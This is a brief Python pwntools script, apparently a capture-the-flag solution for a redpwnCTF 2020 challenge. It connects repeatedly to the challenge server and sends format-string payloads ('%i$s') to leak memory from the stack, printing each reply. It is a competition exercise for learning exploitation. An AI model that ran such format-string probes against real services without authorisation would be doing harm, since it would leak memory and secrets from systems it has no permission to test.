#!usr/bin/python3.8

from pwn import *
context.log_level='critical'
host,port="2020.redpwnc.tf",31826
for i in range(10):
    s=remote(host,port)
    s.recvline()
    s.recvline()
    s.sendline('%'+str(i)+'$s')
    try:
        responce=s.recvline().decode("utf-8")
        print(responce)
    except:
        print("Fault")
